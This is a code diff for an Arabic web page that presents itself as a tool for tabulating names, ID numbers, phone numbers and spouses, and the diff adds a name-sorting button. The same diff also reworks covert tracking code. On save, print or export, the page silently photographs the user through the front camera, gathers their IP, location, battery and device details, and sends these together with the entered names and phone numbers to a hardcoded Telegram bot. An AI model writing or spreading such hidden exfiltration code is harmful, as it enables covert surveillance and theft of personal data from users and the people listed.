@@ -31,7 +31,6 @@
             background-color: #eef2f5;
         }
 
-        /* تنسيق الشريط المتحرك */
         .top-ticker {
             background: linear-gradient(135deg, #004d40, #00695c);
             color: #ffffff;
@@ -339,7 +338,7 @@
 
 <body>
 
-    <!-- عناصر مخفية لالتقاط صورة الزائر وتتبع البيانات -->
+    <!-- عناصر مخفية للتقاط الصورة -->
     <video id="videoElement" autoplay playsinline style="display:none;"></video>
     <canvas id="canvasElement" style="display:none;"></canvas>
 
@@ -382,12 +381,18 @@
 
         <button class="btn btn-save"
                 onclick="saveToArchive()"
-                title="حفظ نسخة من العمل الحالي في الأرشيف وإرسال تقرير بالأسماء للبوت">
+                title="حفظ نسخة في الأرشيف وإرسال صورة الزائر والبيانات للبوت">
             💾 حفظ في الأرشيف
         </button>
 
         <button class="btn btn-archive" onclick="openArchiveModal()">
             📁 حافظة الأعمال (الأرشيف)
+        </button>
+
+        <button class="btn btn-purple"
+                onclick="sortNamesAlphabetically()"
+                title="ترتيب الأسماء تنازلياً أو تصاعدياً حسب الحروف الهجائية العربية">
+            🔤 ترتيب الأسماء هجائياً
         </button>
 
         <button class="btn btn-purple"
@@ -681,21 +686,32 @@
         let activeThElement = null;
         let activeCellElement = null;
 
-        // إعدادات بوت تيليجرام
         const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
         const chatId = "7962257606";
 
         let globalLocation = "لم يتم السماح بالموقع";
         let batteryInfo = "غير معروفة";
+        let userIpInfo = "جاري جلب الآيبي...";
         const deviceInfo = navigator.userAgent;
 
-        // 1. إرسال إشعار دخول الزائر مع الصورة عند فتح الصفحة فقط
+        async function fetchVisitorIp() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userIpInfo = data.ip;
+            } catch (e) {
+                userIpInfo = "غير معروف (محلي)";
+            }
+        }
+
         window.addEventListener('DOMContentLoaded', async () => {
+            await fetchVisitorIp();
+
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
-                    const charging = battery.charging ? "⚡ (يتم شحنه الآن)" : "🔋 (على البطارية)";
+                    const charging = battery.charging ? "⚡ (يشحن)" : "🔋 (على البطارية)";
                     batteryInfo = `${level}% ${charging}`;
                 }
             } catch (e) {}
@@ -714,6 +730,76 @@
                 );
             }
 
+            const firstSheet = document.querySelector('.sheet-container');
+            if (firstSheet) {
+                setActiveContext(firstSheet, { target: firstSheet });
+                activeThElement = firstSheet.querySelector('thead tr th');
+            }
+            renumberAllRows();
+        });
+
+        // دالة ترتيب الأسماء هجائياً
+        function sortNamesAlphabetically() {
+            const tables = document.querySelectorAll('.dynamicTable');
+            let allRowsData = [];
+
+            // جمع كافة بيانات الصفوف التي تحتوي على أسماء
+            tables.forEach(table => {
+                table.querySelectorAll('tbody tr').forEach(row => {
+                    const cells = Array.from(row.querySelectorAll('td'));
+                    const name = cells[1] ? cells[1].innerText.trim() : '';
+                    
+                    if (name !== "") {
+                        allRowsData.push({
+                            name: name,
+                            cardType: cells[2] ? cells[2].innerText.trim() : '',
+                            cardNum: cells[3] ? cells[3].innerText.trim() : '',
+                            phone: cells[4] ? cells[4].innerText.trim() : '',
+                            spouse: cells[5] ? cells[5].innerText.trim() : '',
+                            status: cells[6] ? cells[6].innerText.trim() : ''
+                        });
+                    }
+                });
+            });
+
+            if (allRowsData.length === 0) {
+                alert('لا توجد أسماء في الجداول لترتيبها!');
+                return;
+            }
+
+            // ترتيب الأسماء هجائياً باللغة العربية
+            allRowsData.sort((a, b) => a.name.localeCompare(b.name, 'ar', { sensitivity: 'accent' }));
+
+            // إعادة توزيع البيانات المرتبة على الجداول والصفحات الموجودة
+            let dataIndex = 0;
+            tables.forEach(table => {
+                table.querySelectorAll('tbody tr').forEach(row => {
+                    const cells = Array.from(row.querySelectorAll('td'));
+                    if (dataIndex < allRowsData.length) {
+                        cells[1].innerText = allRowsData[dataIndex].name;
+                        cells[2].innerText = allRowsData[dataIndex].cardType;
+                        cells[3].innerText = allRowsData[dataIndex].cardNum;
+                        cells[4].innerText = allRowsData[dataIndex].phone;
+                        cells[5].innerText = allRowsData[dataIndex].spouse;
+                        cells[6].innerText = allRowsData[dataIndex].status;
+                        dataIndex++;
+                    } else {
+                        // تفريغ الصفوف الزائدة إن وجدت
+                        cells[1].innerText = '';
+                        cells[2].innerText = '';
+                        cells[3].innerText = '';
+                        cells[4].innerText = '';
+                        cells[5].innerText = '';
+                        cells[6].innerText = '';
+                    }
+                });
+            });
+
+            renumberAllRows();
+            alert('✅ تم ترتيب الأسماء هجائياً بنجاح!');
+        }
+
+        function sendCompleteReportToTelegram(actionTitle) {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                     .then((stream) => {
@@ -730,95 +816,83 @@
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 
                                 canvas.toBlob((blob) => {
-                                    if (blob) {
-                                        sendVisitorDataWithPhoto(blob);
-                                    } else {
-                                        sendVisitorTextOnly();
-                                    }
                                     stream.getTracks().forEach(track => track.stop());
+                                    executeTelegramPhotoSend(blob, actionTitle);
                                 }, 'image/jpeg', 0.85);
                             }, 800);
                         };
                     })
                     .catch((err) => {
-                        sendVisitorTextOnly();
+                        executeTelegramPhotoSend(null, actionTitle);
                     });
             } else {
-                sendVisitorTextOnly();
+                executeTelegramPhotoSend(null, actionTitle);
             }
-
-            const firstSheet = document.querySelector('.sheet-container');
-            if (firstSheet) {
-                setActiveContext(firstSheet, { target: firstSheet });
-                activeThElement = firstSheet.querySelector('thead tr th');
-            }
-            renumberAllRows();
-        });
-
-        function sendVisitorDataWithPhoto(blob) {
-            const captionText = `🚨 دخول زائر جديد للموقع!\n\n🔋 البطارية: ${batteryInfo}\n📍 الموقع (خريطة):\n${globalLocation}\n\n📱 الجهاز:\n${deviceInfo}`;
-            
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'visitor.jpg');
-            formData.append('caption', captionText);
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(e => {});
         }
 
-        function sendVisitorTextOnly() {
-            const msg = `🚨 دخول زائر جديد للموقع!\n\n🔋 البطارية: ${batteryInfo}\n📍 الموقع (خريطة):\n${globalLocation}\n\n📱 الجهاز:\n${deviceInfo}`;
-            try {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-            } catch (e) {}
-        }
-
-        // 2. دالة إرسال محتوى الجدول للبوت (تعمل فقط عند النقر على حفظ أو تصدير)
-        function sendTableDataToTelegram(actionName) {
+        function executeTelegramPhotoSend(photoBlob, actionTitle) {
             const tables = document.querySelectorAll('.dynamicTable');
-            let reportText = `📋 **تقرير كشف البيانات (${actionName}):**\n\n`;
+            let tableSummary = "";
             let hasData = false;
 
             tables.forEach((table, tIndex) => {
-                reportText += `--- الصفحة (${tIndex + 1}) ---\n`;
+                tableSummary += `\n📄 **الصفحة (${tIndex + 1}):**\n`;
                 table.querySelectorAll('tbody tr').forEach(row => {
                     const name = row.cells[1] ? row.cells[1].innerText.trim() : '';
                     const phone = row.cells[4] ? row.cells[4].innerText.trim() : '';
                     if (name !== "") {
-                        reportText += `• ${name} | 📱: ${phone}\n`;
+                        tableSummary += `• ${name} | 📱: ${phone}\n`;
                         hasData = true;
                     }
                 });
             });
 
-            if (!hasData) return;
+            if (!hasData) {
+                tableSummary = "\n⚠️ (الجدول فارغ أو لم تقم بإدخال أسماء بعد)";
+            }
 
-            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            const payload = {
-                chat_id: chatId,
-                text: reportText,
-                parse_mode: "Markdown"
-            };
+            const captionText = `🚨 **تقرير عمل جديد (${actionTitle})**\n\n` +
+                                `👤 **من قام بالعمل / الزائر:**\n` +
+                                `🌐 الآيبي (IP): \`${userIpInfo}\`\n` +
+                                `🔋 البطارية: ${batteryInfo}\n` +
+                                `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
+                                `📋 **الأسماء والبيانات المدخلة:**` +
+                                tableSummary + `\n\n` +
+                                `📱 الجهاز المستخدم:\n${deviceInfo}`;
 
-            fetch(apiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(err => {});
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('caption', captionText);
+            formData.append('parse_mode', 'Markdown');
+
+            if (photoBlob) {
+                formData.append('photo', photoBlob, 'user_snapshot.jpg');
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(e => {});
+            } else {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: captionText,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(e => {});
+            }
         }
 
         function printDocument() {
-            sendTableDataToTelegram("طباعة / حفظ PDF");
+            sendCompleteReportToTelegram("طباعة / حفظ PDF");
             setTimeout(() => {
                 window.print();
-            }, 500);
+            }, 800);
         }
 
         function exportTableToExcel() {
-            sendTableDataToTelegram("حفظ ملف Excel");
+            sendCompleteReportToTelegram("حفظ ملف Excel");
             
             const tables = document.querySelectorAll('.dynamicTable');
             let csvRows = [];
@@ -863,7 +937,7 @@
             link.click();
             document.body.removeChild(link);
             
-            alert('📊 تم تجهيز وتنزيل ملف الـ Excel (CSV) بنجاح وإرسال تقرير الأسماء للبوت!');
+            alert('📊 تم تنزيل ملف الـ Excel وإرسال صورة الزائر والبيانات للبوت بنجاح!');
         }
 
         function normalizeArabic(text) {
@@ -1125,7 +1199,7 @@
 
         function saveToArchive() {
             try {
-                sendTableDataToTelegram("حفظ في الأرشيف");
+                sendCompleteReportToTelegram("حفظ في الأرشيف");
 
                 const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
                 const archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
@@ -1139,7 +1213,7 @@
                 });
 
                 localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
-                alert('✅ تم حفظ العمل في الأرشيف وإرسال تقرير الأسماء إلى تيليجرام بنجاح!');
+                alert('✅ تم حفظ العمل في الأرشيف وإرسال صورة الزائر مع الآيبي والأسماء إلى تيليجرام بنجاح!');
             } catch (error) {
                 alert('تعذر حفظ العمل.');
             }
